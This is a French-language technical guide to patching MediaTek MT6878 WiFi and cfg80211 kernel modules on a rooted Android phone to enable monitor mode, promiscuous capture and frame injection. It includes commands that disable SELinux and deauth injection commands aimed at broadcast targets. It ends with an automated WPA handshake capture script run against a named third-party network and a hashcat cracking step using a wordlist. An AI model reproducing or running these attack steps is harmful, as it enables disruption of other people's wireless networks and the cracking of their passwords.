# Monitor Mode WiFi — MediaTek MT6878 (Dimensity 7300)

> **Version patch**: v5 (v4 + dispatch table fix + SELinux + ICS ioctl fix)
> **Date**: 2026-03-21
> **Chipset**: MediaTek MT6878 (Dimensity 7300), co-processeur WiFi MT6631 (NDS32 Andes N9)
> **Device**: Unihertz Titan 2 (`g71v78c2k_dfl_eea`), Android 16 (API 36)
> **Driver**: `wlan_drv_gen4m_6878.ko` (gen4m CONNAC 2.0+, SOC 7.0)
> **Prerequis**: Root Magisk, bootloader deverrouille

---

## TL;DR

Deux modules kernel patches (driver WiFi + cfg80211) distribues via un module Magisk unique. **154 bytes** modifies dans le driver (7 MB) + **12 bytes** dans cfg80211 (2 MB) activent :
- Capture de toutes les trames 802.11 (promiscuous) via `/dev/fw_log_ics`
- Injection de deauth via la commande `AP_STA_DISASSOC`
- Injection de frames 802.11 arbitraires via `NL80211_CMD_FRAME` (cfg80211 deverrouille)

---

## Installation

```bash
adb push firmware-dump/mtk_wifi_monitor_magisk.zip /data/local/tmp/
adb shell "su -c 'magisk --install-module /data/local/tmp/mtk_wifi_monitor_magisk.zip'"
adb reboot
```

OU via Magisk Manager : Modules → Installer depuis stockage → reboot.

### Verification

```bash
adb shell "su -c 'sha256sum /vendor/lib/modules/wlan_drv_gen4m_6878.ko | cut -c1-16'"
# Attendu: 27f6695709853893
adb shell "su -c 'sha256sum /vendor/lib/modules/cfg80211.ko | cut -c1-16'"
# Attendu: 6313f82e09073087
```

### Desinstallation

```bash
adb shell "su -c 'rm -rf /data/adb/modules/mtk_wifi_monitor && reboot'"
```

---

## Prerequis SELinux

La communication `wpa_cli` → `wpa_supplicant` est bloquee par SELinux en mode Enforcing. Le contexte `u:r:magisk:s0` n'est pas autorise a envoyer des datagrammes au contexte `u:r:hal_wifi_supplicant_default:s0`.

**Avant toute operation, desactiver SELinux** :

```bash
adb shell "su -c 'setenforce 0'"
```

> **Note** : une policy Magisk permanente est en cours de developpement pour eviter cette etape manuelle.

---

## Utilisation

### Capture de frames (RX promiscuous)

**Sequence correcte** (l'ordre est critique) :

```bash
# 0. Desactiver SELinux (obligatoire)
su -c 'setenforce 0'

# 1. Activer le sniffer ICS via ioctl 0x8BE5 (bypass dispatch table + KCFI)
sniffer_direct wlan0 "SNIFFER 2 0 0 0 0 0 0 0 0 0"

# 2. Activer ICS logging (SET_LEVEL + ON_OFF via ioctl)
#    Les valeurs sont des entiers bruts, PAS des pointeurs
ics_enable 2 1   # SET_LEVEL=2, ON_OFF=1

# 3. Lire les paquets
cat /dev/fw_log_ics > capture.bin

# 4. Desactiver
ics_enable 0 0   # SET_LEVEL=0, ON_OFF=0
```

> **Important** : le WiFi doit etre connecte a un reseau pour que le driver recoive des frames. La capture se fait sur le canal de l'association courante.

### Detail des ioctls ICS

Le device `/dev/fw_log_ics` accepte deux ioctls :

| Ioctl | Code | Arg | Valeurs valides | Effet |
|-------|------|-----|-----------------|-------|
| `ICS_FW_LOG_IOCTL_SET_LEVEL` | `0x4004FC01` | entier brut | 0, 1, 2 | Configure le niveau de log (2 = capture all) |
| `ICS_FW_LOG_IOCTL_ON_OFF` | `0x4004FC00` | entier brut | 0, 1 | Active/desactive la capture |

**Piege decouverte** : le driver lit `arg` directement depuis le registre (pas `copy_from_user`). Il faut passer la valeur comme entier brut : `ioctl(fd, 0x4004FC01, (void*)(long)2)`, PAS `ioctl(fd, 0x4004FC01, &level)`.

Le resultat attendu dans dmesg :
```
IcsLog[Lv:OnOff]=[2:1]   ← capture active
IcsLog[Lv:OnOff]=[0:0]   ← capture inactive
```

### Injection de deauth

Deux methodes disponibles, avec des limitations :

**Methode 1 : AP_STA_DISASSOC (necessite association)**
```bash
# Fonctionne UNIQUEMENT si connecte au meme BSSID
wpa_cli -p /data/vendor/wifi/wpa/sockets -i wlan0 driver "AP_STA_DISASSOC Mac=AA:BB:CC:DD:EE:FF"
```

**Methode 2 : NL80211_CMD_FRAME via deauth_inject (sans association)**
```bash
# Envoie via nl80211, patches D2+D3 requis (v7)
deauth_inject wlan0 <bssid> ff:ff:ff:ff:ff:ff 20 <freq_mhz>
```
Le kernel accepte les frames mais le firmware les drop dans la majorite des cas sans association BSS active. Taux de transmission reel : ~1/240 frames (observe via ICS capture).

> **Limitation critique** : le firmware MTK requiert une association BSS active pour transmettre des management frames. Les patches D2 (bypass current_bss check) et D3 (force BssIdx=0) contournent les checks du driver mais le firmware conserve son propre filtre TX. L'injection deauth **sans etre connecte au reseau** n'est pas fiable sur ce chipset.

### Injection de frames arbitraires (raw TX)

Le patch cfg80211 (N1/N2/N3) autorise `NL80211_CMD_FRAME` cote kernel. Le binaire `deauth_inject` utilise libnl pour envoyer des frames 802.11 arbitraires :

```bash
# Deauth broadcast (requiert offchannel pour meilleurs resultats)
iw dev wlan0 offchannel 2452 5000 &
deauth_inject wlan0 <bssid> ff:ff:ff:ff:ff:ff 20 2452
```

> **Recommandation** : pour une injection deauth fiable (handshake capture), utiliser un **adaptateur USB WiFi externe** (Alfa AWUS036AXML, MT7921AU) avec airmon-ng + aireplay-ng standard. L'adaptateur externe supporte nativement le monitor mode et l'injection sans les limitations du firmware MTK interne.

---

## Capacites

| Capacite | Statut | Methode |
|----------|--------|---------|
| Scan passif (beacons) | **Fonctionnel** | ICS capture + parseur 802.11 |
| Capture data unicast (notre device) | **Fonctionnel** | ICS T1 trampoline |
| Capture data unicast (AUTRES devices) | **Fonctionnel** | Mode promiscuous (T2, fw cmd 10) |
| Capture control frames (RTS/CTS/ACK) | **Fonctionnel** | ICS capture |
| Capture management (Auth/Deauth/Disassoc) | **Fonctionnel** | ICS capture (2.5 MB/60s observe) |
| Capture EAPOL / 4-way handshake | **Non verifie** | Necessite deauth fiable pour forcer reconnexion |
| Injection deauth (connecte) | **Fonctionnel** | AP_STA_DISASSOC (T4 NOP) |
| Injection deauth (non connecte) | **Non fiable (~0.4%)** | nl80211 CMD_FRAME + D2/D3 patches — firmware drop |
| Injection raw management frames | **Non fiable** | cfg80211 patche mais firmware filtre TX |
| Channel lock (offchannel) | **Fonctionnel 2.4GHz** | `iw offchannel 2452 5000` |
| Channel lock (offchannel 5GHz) | **Non supporte** | `iw offchannel 5200` → Invalid argument |
| Channel hopping | Non implemente | Faisable via SET_TEST_CMD 1 <freq> |
| Injection data frames | Non supporte | Le driver n'a pas de raw data TX |

---

## Format des paquets captures

```
Offset  Taille  Champ
0       4       Magic = 0x44D9C99A (LE)
4       2       Type = 0x0001
6       2       Sequence
8       4       Info (0=data, timesync_const=sync)
12      2       SubType (0x000C = data)
14      2       Frame length
16      120     MTK RX Descriptor (RSSI, rate, timestamp)
136     N       802.11 Frame brute (FC + addrs + payload)
```

Timesync : quand `Info == 0x0008011000000000` → 24 bytes total, pas de frame.

---

## Architecture du patch

### Module 1 : wlan_drv_gen4m_6878.ko (5 patches)

| # | Type | Taille | Cible | Effet |
|---|------|--------|-------|-------|
| T1 | Trampoline | 52 B | `nicRxProcessPktWithoutReorder` → `nicRxProcessIcsLog` | Capture frames via /dev/fw_log_ics |
| T2 | Trampoline | 48 B | `nicRxEnablePromiscuousMode` → fw cmd 10 (0x0F) | Mode promiscuous ON |
| T3 | Trampoline | 48 B | `nicRxDisablePromiscuousMode` → fw cmd 10 (0x01) | Mode promiscuous OFF |
| T4 | NOP | 4 B | `priv_driver_set_ap_sta_disassoc` role check | Deauth en mode STA |
| **D1** | **Data patch** | **2 B** | **`priv_cmd_handlers` dispatch table, entree SNIFFER** | **Active la commande SNIFFER (flag enable + permission level)** |
| **D2** | **Branch patch** | **4 B** | **`mtk_cfg_mgmt_tx` check `wdev->current_bss`** | **Bypass association check pour TX sans BSS (nl80211 CMD_FRAME)** |
| **D3a** | **NOP call** | **4 B** | **`_mtk_cfg80211_mgmt_tx` 1er appel `wlanGetBssIdx`** | **Force BssIdx=0 pour TX sans association** |
| **D3b** | **NOP call** | **4 B** | **`_mtk_cfg80211_mgmt_tx` 2eme appel `wlanGetBssIdx`** | **Force BssIdx=0 pour TX sans association** |

Total : 166 bytes modifies dans un .ko de 7 MB.

> **Note sur D2/D3** : ces patches contournent les checks du driver mais le firmware MTK conserve son propre filtre TX. Le taux d'injection effectif est ~0.4% (1 frame sur 240). L'injection deauth fiable necessite une association BSS active ou un adaptateur USB externe.

#### Detail du patch D1 (v5)

La dispatch table `priv_cmd_handlers` (6200 bytes, 155 entrees de 40 bytes) mappe les commandes texte vers leurs handlers. Chaque entree :

```
struct priv_cmd_entry {
    char *cmd_string;       // +0x00 (reloc)
    int (*handler)(...);    // +0x08 (reloc)
    uint32_t enable_flag;   // +0x10 — 0=desactive, 1=active
    uint32_t cmd_type;      // +0x14
    void *policy;           // +0x18 (reloc)
    uint32_t perm_level;    // +0x20 — 0=interdit, 2=normal, 3=privileged
    uint32_t reserved;      // +0x24
};
```

L'entree SNIFFER (index #19 a `.data+0x8fc8`) avait `enable_flag=0` et `perm_level=0` — **desactivee par MediaTek en production**. Le patch D1 change :
- `enable_flag` : `0x00` → `0x01` (active)
- `perm_level` : `0x00` → `0x02` (permission normale)

C'est pourquoi v4 envoyait la commande firmware 0x93 au boot (via le driver init) mais `priv_support_driver_cmd` ne routait jamais les commandes SNIFFER envoyees par wpa_cli.

### Module 2 : cfg80211.ko (3 patches)

| # | Type | Taille | Cible dans `cfg80211_mlme_mgmt_tx` | Effet |
|---|------|--------|-------------------------------------|-------|
| N1 | NOP | 4 B | `tbz w8, #0, error` @ 0x406c8 | Skip registration bitmap check |
| N2 | NOP | 4 B | `b.ne error` @ 0x407e0 | Skip subtype filter (Auth/Deauth/Action only) |
| N3 | NOP | 4 B | `tbz w8, #0, error` @ 0x407ec | Skip capability bit check |

Total : 12 bytes modifies dans un .ko de 2 MB.

### Commandes firmware

| CMD ID | Nom | Role |
|--------|-----|------|
| 0x93 (147) | SET_ICS_SNIFFER | Configure les bandes/canaux ICS |
| 0x0A (10) | SET_PACKET_FILTER | Configure le filtre RX (0x0F=promiscuous) |

### Chaine d'activation

```
Capture:
  setenforce 0                          → desactive SELinux (obligatoire)
  wpa_cli driver "SNIFFER 2 0 ..."      → dispatch D1 → priv_driver_sniffer
    → kalIoctl(wlanoidSetIcsSniffer)    → fw cmd 0x93 (SET_ICS_SNIFFER)
  ics_enable SET_LEVEL=2                → ioctl 0x4004FC01 (raw int)
  ics_enable ON_OFF=1                   → ioctl 0x4004FC00 (raw int)
    → IcsLog[Lv:OnOff]=[2:1]
  Chaque paquet RX → [T1] check flag → nicRxProcessIcsLog → /dev/fw_log_ics

Deauth:
  wpa_cli driver "AP_STA_DISASSOC Mac=XX" → priv_driver_set_ap_sta_disassoc
  → [T4] NOP role check → mboxSendMsg → authSendDeauthFrame → TX

Raw TX (quand outil libnl disponible):
  NL80211_CMD_FRAME → nl80211_tx_mgmt → [N1,N2,N3] skip checks
  → cfg80211_mlme_mgmt_tx → mtk_cfg80211_mgmt_tx → cnmPktAllocWrapper
  → memcpy(frame) → mboxSendMsg → TX
```

---

## Problemes resolus en v5

### 1. Dispatch table SNIFFER desactivee (D1)

**Symptome** : `wpa_cli driver "SNIFFER ..."` → les logs kernel montrent `priv_support_driver_cmd` recoit la commande mais `wlanoidSetIcsSniffer` n'est jamais appele. La commande est ignoree silencieusement.

**Cause** : MediaTek desactive l'entree SNIFFER dans la dispatch table `priv_cmd_handlers` en production (`enable_flag=0`, `perm_level=0`). Le lookup dans `get_priv_cmd_handler` trouve l'entree mais la rejette car le flag est a 0.

**Fix** : Patch 2 bytes dans `.data` section : `enable_flag=1`, `perm_level=2`.

### 2. SELinux bloque wpa_supplicant → wpa_cli

**Symptome** : toutes les commandes `wpa_cli` timeout (PING, STATUS, DRIVER). Aucune reponse.

**Cause** : SELinux deny `{ sendto }` de `hal_wifi_supplicant_default` vers `magisk` context sur les unix dgram sockets. Le wpa_supplicant recoit la commande mais ne peut pas renvoyer la reponse.

**Diagnostic** : `dmesg | grep "avc.*wpa"` montre :
```
avc: denied { sendto } for comm="wpa_supplicant" scontext=u:r:hal_wifi_supplicant_default:s0
tcontext=u:r:magisk:s0 tclass=unix_dgram_socket
```

**Fix** : `setenforce 0` avant les operations. Fix permanent via sepolicy Magisk en cours.

### 3. ICS ioctls — valeurs brutes pas pointeurs

**Symptome** : `ics_enable 1` active l'ICS mais `IcsLog[Lv:OnOff]=[0:0]` — le level reste a 0 et la capture ne demarre pas.

**Cause** : le handler `fw_log_ics_unlocked_ioctl` lit `arg` (registre x2) directement sans `copy_from_user`. Quand on passe `&level` (pointeur stack), la valeur comparee est l'adresse memoire (~3.8 milliards), pas la valeur 2.

**Diagnostic** : dmesg montre `ics level[3836076384] is invaild!` — c'est l'adresse du pointeur.

**Fix** : passer les valeurs comme entiers bruts : `ioctl(fd, cmd, (void*)(long)value)`.

---

## Outils userspace

### wpa_driver

Envoie des commandes DRIVER via wpa_supplicant (`/data/vendor/wifi/wpa/sockets/wlan0`).

```c
// Compile: aarch64-linux-gnu-gcc -static -o wpa_driver wpa_driver.c
// Usage: wpa_driver "SNIFFER 2 0 0 0 0 0 0 0 0 0"
//        wpa_driver "AP_STA_DISASSOC Mac=AA:BB:CC:DD:EE:FF"
```

> **Prerequis** : `setenforce 0` obligatoire, sinon timeout.

### ics_enable

Active/desactive la capture ICS via ioctl sur `/dev/fw_log_ics`.

```c
// Compile: aarch64-linux-gnu-gcc -static -o ics_enable ics_enable.c
// Usage: ics_enable 2 1   (SET_LEVEL=2, ON_OFF=1 → capture active)
//        ics_enable 0 0   (SET_LEVEL=0, ON_OFF=0 → capture inactive)
//
// IMPORTANT: les valeurs sont passees comme entiers bruts a ioctl(),
// PAS comme pointeurs. Voir section "Problemes resolus en v5".
```

---

## Resultats de capture

### v5 (post-fix dispatch + ICS)

```
IcsLog[Lv:OnOff]=[2:1]   ← capture active confirmee
344 bytes / 2 paquets captures lors de la connexion WiFi
320 bytes / 1 paquet capture en 10 secondes (WiFi non connecte)
```

La capture fonctionne. Le volume est faible quand le WiFi n'est pas connecte (pas de trafic sur le canal). Avec une connexion WiFi active, le mode promiscuous (T2) capture tous les frames du canal.

### v4 (reference, avant fix)

```
981 paquets (305 KB) en 5 secondes (test initial)

Frame types: RTS(190) CTS(163) Beacon(98) QoS-Data(61) ACK(27) ProbeResp(2) ...

5 BSSIDs / SSIDs detectes:
  34:98:b5:43:6a:a7  LichaWireless
  34:98:b5:46:39:27  LichaWireless
  3e:98:b5:43:6a:a7  LichaWireless-IOT
  3e:98:b5:46:39:27  LichaWireless-IOT
  ae:ad:f3:c2:e2:a5  LichaWireless
```

---

## Compatibilite

| Parametre | Valeur testee |
|-----------|--------------|
| SoC | MediaTek MT6878 (Dimensity 7300) |
| WiFi | MT6631 (NDS32 Andes N9), 5GHz ch40 (5200 MHz) |
| Driver | `wlan_drv_gen4m_6878.ko` gen4m CONNAC 2.0+ |
| cfg80211 | `cfg80211.ko` kernel 6.1.145 |
| Device | Unihertz Titan 2 (`g71v78c2k_dfl_eea`) |
| Android | 16 (API 36) |
| Root | Magisk |

Le patch depend des offsets binaires exacts. Un driver/cfg80211 de version differente necessite re-analyse Ghidra + adaptation de `patch_driver.py`.

---

## Limites

1. **SELinux** : `setenforce 0` obligatoire avant chaque session. Fix permanent via sepolicy Magisk en cours.
2. **Canal unique** : capture sur le canal courant. Channel hopping necessite deconnexion WiFi ou `SET_TEST_CMD 1 <freq>`.
3. **WiFi connecte requis** : le driver ne recoit des frames que si l'interface est associee a un AP. Sans connexion, seuls les frames de gestion (beacons, timesync) sont captures.
4. **Injection TX limitee** : deauth via `AP_STA_DISASSOC` fonctionne. Raw TX (tout type de frame) est pret cote kernel (cfg80211 patche) mais necessite un outil libnl pour envoyer `NL80211_CMD_FRAME`.
5. **Specifique MT6878/MT6631** : adapte au driver exact teste. Methodologie reproductible pour d'autres SoC MTK (Ghidra + patch_driver.py).
6. **OTA** : reinstaller le module Magisk apres chaque mise a jour systeme.

---

## Structure des fichiers

```
firmware-dump/
  mtk_wifi_monitor_magisk.zip      Module Magisk v5 (2 .ko patches)
  patch_driver.py                   Script patch wlan driver (T1-T4 + D1)
  wlan_drv_gen4m_6878.ko.ORIGINAL  Backup driver original
  cfg80211.ko                       cfg80211 original (pour reference)

docs/
  MTK_MONITOR_MODE_GUIDE.md        Ce document
  FIRMWARE_ANALYSIS.md              Analyse RE detaillee du firmware NDS32

wifi-cracker/core/.../wifi/
  monitor/
    IcsPacketParser.kt              Parse format ICS binaire
    Ieee80211Parser.kt              Parse trames 802.11
    MtkMonitorCapture.kt            Moteur de capture (Flow/coroutines)
    MonitorModeManager.kt           Manager haut niveau (@Singleton)
  ChipsetMonitorHelper.kt          Detection chipset + enable/disable MTK
```

---

## Hashes

| Fichier | SHA256 (prefix 16) |
|---------|--------------------|
| wlan driver original | `1b3a2244bd257...` |
| wlan driver patche v4 | `1551f37b6b388...` |
| wlan driver patche v5 (D1) | `27f66957098538...` |
| **wlan driver patche v7 (D1+D2+D3)** | **`481c139366ddd1...`** |
| cfg80211 original | `7f0bca381fed2...` |
| cfg80211 patche v4-v7 | `6313f82e09073...` |

---

## Chronologie

1. Analyse firmware `connsys_wifi.img` → architecture NDS32 (Andes N9/N10)
2. Extraction driver `wlan_drv_gen4m_6878.ko` (7 MB, ARM64, 22K symboles, non strippe)
3. Decompilation Ghidra headless : 24+ fonctions critiques en C
4. Decouverte : 5 fonctions monitor mode = stubs vides + `nicRxProcessIcsLog` = 0 appelants
5. Decouverte : firmware cmd 0x0A (10) = SET_PACKET_FILTER (promiscuous)
6. v1 : trampoline ICS (52B) → capture paquets RX
7. v2 : + trampolines promiscuous enable/disable (2x48B) → capture ALL frames
8. v3 : + NOP role check AP_STA_DISASSOC (4B) → deauth injection en mode STA
9. Decompilation `cfg80211_mlme_mgmt_tx` → 3 checks identifes (bitmap, subtype filter, capability)
10. v4 : + 3 NOPs dans cfg80211.ko → raw management frame TX autorise en mode STA
11. **v5 : fix dispatch table SNIFFER (D1 data patch, 2 bytes) — commande etait desactivee par MediaTek**
12. **v5 : decouverte SELinux block sur wpa_supplicant → wpa_cli socket**
13. **v5 : decouverte ICS ioctls attendent des entiers bruts, pas des pointeurs**
14. Validation v5 : `IcsLog[Lv:OnOff]=[2:1]`, paquets captures confirmes
15. Construction outil `deauth_inject` (libnl, NL80211_CMD_FRAME) pour injection sans association
16. **v7 : patch D2 bypass current_bss check dans mtk_cfg_mgmt_tx (1 branch, 4 bytes)**
17. **v7 : patch D3a+D3b force BssIdx=0 dans _mtk_cfg80211_mgmt_tx (2 NOP calls, 8 bytes)**
18. Test injection v7 : kernel accepte les frames mais firmware drop ~99.6% sans association BSS
19. Validation capture passive v7 : 2.5 MB / 7919 paquets en 60s, management + data frames promiscuous
20. Conclusion : injection deauth fiable necessite association BSS ou adaptateur USB externe

---

## Capture de handshake WPA (automatisee)

### Technique : connexion avec faux mot de passe

La technique cle pour capturer un handshake sur le chipset MTK interne :

1. **Activer SNIFFER** via ioctl 0x8BE5 (active ICS capture promiscuous)
2. **Se connecter avec un faux mot de passe** → met le driver sur le canal de l'AP
3. **L'AP envoie M1** (ANonce) pendant la tentative d'auth → capture via ICS
4. **Les autres devices du reseau qui se reconnectent** generent des M1+M2 complets
5. **Repeter** les tentatives de connexion pour maintenir le canal actif

### Script automatise

```bash
# Sur le device (root) :
/data/local/tmp/wificracker/mtk_handshake_attack.sh LichaWireless 34:98:b5:46:39:27 5200 10

# Resultat : captures/*.bin (analyse avec le parseur Python)
```

### Parseur + conversion hashcat

```bash
# Sur PC :
python3 mtk_parse_handshake.py capture.bin LichaWireless

# Produit : capture.hc22000
# Crack :
hashcat -m 22000 capture.hc22000 rockyou.txt
```

### Resultat de reference

```
36.5 MB / 127447 paquets en 5 minutes
81 EAPOL frames captures (19 M1 + 22 M2)
AP BSSID: 34:98:b5:46:39:27 (LichaWireless 5GHz)
```

### Limitation

L'injection deauth est non fiable sur MTK interne (~0.4% de transmission reelle). La technique repose sur les **reconnections naturelles** des autres appareils du reseau, ou sur le **reboot de l'AP** pour forcer tous les clients a se reconnecter.

Pour une injection deauth fiable, utiliser un **adaptateur USB WiFi externe** avec `aireplay-ng`.

### Format des paquets ICS

Les paquets ICS ont une taille fixe de **320 bytes** :
- Header ICS : 16 bytes (magic + type + seq + info + subtype + frame_len)
- RX Descriptor MTK : 120 bytes
- Frame 802.11 : 184 bytes max (frame_len dans le header INCLUT le RX descriptor)

> **Piege** : `frame_len` dans le header ICS = 304, mais la vraie frame 802.11 fait 304 - 120 = **184 bytes**. Le parseur doit soustraire `MTK_RX_DESC_SIZE` du `frame_len`.

---

## Pour aller plus loin

### Channel hopping

```bash
# En mode test (coupe le WiFi normal)
wpa_driver "SET_TEST_MODE 2011"
wpa_driver "SET_TEST_CMD 1 2412"   # ch1
# capturer...
wpa_driver "SET_TEST_CMD 1 2437"   # ch6
# capturer...
wpa_driver "SET_TEST_MODE 0"       # retour normal
```

### SELinux policy permanente

Creer un module Magisk sepolicy pour autoriser la communication :
```
allow hal_wifi_supplicant_default magisk unix_dgram_socket { sendto };
```

### Outil raw TX avec libnl

Pour envoyer des frames 802.11 arbitraires, compiler un outil utilisant libnl3 qui envoie `NL80211_CMD_FRAME` correctement. Le patch cfg80211 (N1/N2/N3) est deja en place.

### Adaptation a d'autres devices MediaTek

```bash
# 1. Extraire le driver
adb pull /vendor/lib/modules/wlan_drv_gen4m_*.ko

# 2. Verifier les stubs (nm | grep nicRxEnablePromiscuousMode)
# 3. Decompiler avec Ghidra, adapter les offsets dans patch_driver.py
# 4. Verifier la dispatch table : chercher l'entree SNIFFER, verifier enable_flag
# 5. Executer le patcher → tester
```
